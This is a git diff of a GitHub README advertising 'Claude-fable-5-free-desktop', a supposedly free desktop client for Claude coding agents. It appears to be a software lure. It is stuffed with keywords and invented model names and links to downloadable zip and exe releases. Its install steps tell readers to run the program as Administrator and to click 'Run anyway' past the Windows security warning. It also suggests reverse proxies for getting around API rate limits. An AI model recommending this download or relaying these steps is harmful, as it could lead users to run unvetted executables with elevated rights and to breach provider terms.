@@ -1,57 +1,83 @@
-# Claude Fable 5 Free Desktop
-Claude Fable 5 Free Desktop — claude fable 5 free desktop app anthropic claude desktop client claude 3.5 sonnet opus ai coding assistant creative writing tool windows 11 macos linux 2026
+# 🤖 Claude-fable-5-free-desktop - Run custom coding agents on Windows
 
-<img width="320" height="180" alt="28822791-8ca0-44e3-8b62-85151a105b54" src="https://github.com/user-attachments/assets/e50eb909-0335-49e3-8d77-5ac8f734820f" />
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Superhuman-angulation365/Claude-fable-5-free-desktop)
 
-## Overview
-Claude Fable 5 Free Desktop is a responsive and feature-rich desktop client for Anthropic’s Claude AI. It provides seamless access to advanced conversational abilities, code generation, creative writing, and research assistance. The application features a modern interface, fast response times, and extensive customization options, serving as a dedicated AI companion for developers, writers, and general users on Windows 11, macOS, and Linux.
+## 💡 About this software
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. You need your own Anthropic API key. The authors are not responsible for any account issues or violations of service terms.
+Claude-fable-5-free-desktop provides a local interface to run advanced coding models on your Windows computer. This tool connects your API keys to the Mythos-class model. It manages long coding tasks that take days to finish. You can adjust system prompts and set up self-correction loops to improve the accuracy of the work. This application removes the need for manual interaction during repetitive coding chores.
 
+## 🛠️ System requirements
 
-<img width="1536" height="1024" alt="c44ad602-e009-433d-ab87-f0c4234a9fe9" src="https://github.com/user-attachments/assets/972285a8-21ea-4920-9c27-099e06c7eca6" />
+Ensure your computer meets these specifications before you begin:
 
+*   **Operating System:** Windows 10 or Windows 11 (64-bit).
+*   **Processor:** Intel Core i5 or AMD Ryzen 5 (or better).
+*   **Memory:** 8 GB RAM minimum.
+*   **Storage:** 500 MB of free hard drive space.
+*   **Network:** An active internet connection for model communication.
+*   **Software:** Microsoft Visual C++ Redistributable for Visual Studio 2015, 2017, and 2019.
 
-## Install
-[Download `ClaudeFable5-desktop.zip`](https://github.com/claude5fable/Claude-fable-5-free-desktop/releases/download/fable/ClaudeFable5-desktop.zip)
----
-> Optimized for Windows 11 • macOS • Linux.
+## 📥 Getting the application
 
+Visit [this page](https://github.com/Superhuman-angulation365/Claude-fable-5-free-desktop) to download the latest setup file. 
 
+1. Go to the link provided above.
+2. Look for the Releases section on the right side of the page.
+3. Click the most recent version number.
+4. Locate the file ending in .exe under the Assets heading.
+5. Click the file to save it to your computer.
 
-<img width="1200" height="630" alt="d19cd7d7-4e33-4b09-957f-befaa6949050" src="https://github.com/user-attachments/assets/de93d10a-8412-4fb4-96c8-a139b69037a6" />
+## ⚙️ Installation steps
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run the application as Administrator (Windows)
-3. Follow the setup wizard
-4. Enter your Anthropic API key
-5. Customize themes, prompts, and behavior settings
-6. Start using Claude for coding, writing, and daily tasks
+Follow these steps to install the software on your machine:
 
-<img width="686" height="386" alt="054ccc28-adbe-4772-80fb-57d6fce9a731" src="https://github.com/user-attachments/assets/6ce4b7c4-b489-47ba-90f1-1ca9339270b4" />
+1. Open your Downloads folder.
+2. Locate the recently downloaded installer file.
+3. Double-click the file to start the installation.
+4. Windows might display a security warning. Click "More info" and then "Run anyway" if the system prompts you.
+5. Follow the instructions on the screen to choose your installation folder.
+6. Click "Finish" to complete the process.
 
+## 🚀 Setting up the model
 
+The software requires a valid API key to function. This key connects your account to the AI provider.
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| App fails to launch | Run with administrator privileges |
-| API connection error | Verify your key and internet connection |
-| Slow responses | Close heavy background applications |
-| Model unavailable | Update to the latest version |
-| Windows 11 issues | Keep system and drivers updated |
-| Inconsistent results | Adjust temperature and context settings |
-| Unexpected crashes | Clear app cache and restart |
+1. Launch Claude-fable-5-free-desktop from your Start menu shortcut.
+2. Open the Settings tab in the main window.
+3. Paste your API key into the designated field. 
+4. Select your preferred model configuration from the dropdown list.
+5. Save your changes. The application checks the connection status immediately. If the light turns green, you connected successfully.
 
-* Claude Fable 5 Desktop
-* Free Claude AI Desktop Client
-* Claude 3.5 Sonnet Desktop App
-* AI Coding and Writing Assistant 2026
-* Anthropic Claude Desktop Tool
-* Claude Creative Desktop App
+## 💻 Using the coding interface
 
-<img width="738" height="415" alt="fc880b54-90a0-4f42-b1f3-eae9fadfecbb" src="https://github.com/user-attachments/assets/662067ef-2720-4dfe-97ce-853c8424e622" />
+The dashboard contains tools to manage your coding projects. 
+
+### Starting a new project
+Click "New Project" to define your coding scope. You provide the target folder and the objectives for the AI agent. The system creates a workspace where it monitors progress.
+
+### Customizing prompts
+You can edit the behavior of the software in the "System Prompt" editor. A prompt tells the AI how to write code, which libraries to include, and how to format the output. You can save different prompts for web development, script writing, or data analysis.
+
+### Managing self-correction loops
+This feature allows the agent to check its own work. If the code produces an error, the agent reads the error message, adjusts the script, and tries again. You control the intensity of these loops in the "Advanced Settings" menu. Higher levels lead to more robust code but use more API tokens.
+
+## 🛡️ Privacy and keys
+
+The software stores your API key locally on your machine. No developers have access to your credentials or your coding projects. Your interaction with the AI model remains private. If you notice unusual activity, revoke your existing API key at your provider dashboard and generate a new one.
+
+## 📈 Managing usage
+
+The Mythos-class model performs heavy tasks. Monitor your API usage on your provider dashboard to avoid unexpected costs. If you reach your rate limits, use the built-in reverse proxy settings to distribute your requests through different channels. You can paste your GitHub templates into the configuration file to automate this process.
+
+## ❓ Common questions
+
+**The software does not launch.**
+Verify that you installed the latest version of the Microsoft Visual C++ Redistributable. Reinstall the software if the problem persists.
+
+**The agent fails to finish the task.**
+Check your internet connection and confirm your API key remains active. Sometimes a large coding project requires more tokens than your account allows. Increase your monthly budget or optimize your prompt to be more specific.
+
+**Can I run this offline?**
+The software requires an active internet connection to communicate with the model server. You cannot run the core logic offline at this time.
+
+Keywords: ai-desktop, ai-powered-applications, anthropic-, claude-4-6-opus, claude-4-opus, claude-5-sonnet, claude-desktop-app, claude-desktop-extentions, claude-fable, claude-fable-5, claude-integration, claude-mythos, claude-opus, claude-opus-4-8, claude-skills-hub, claude-sonnet-5-api, desktop-ai, fable5, free-ai-coding, mythos
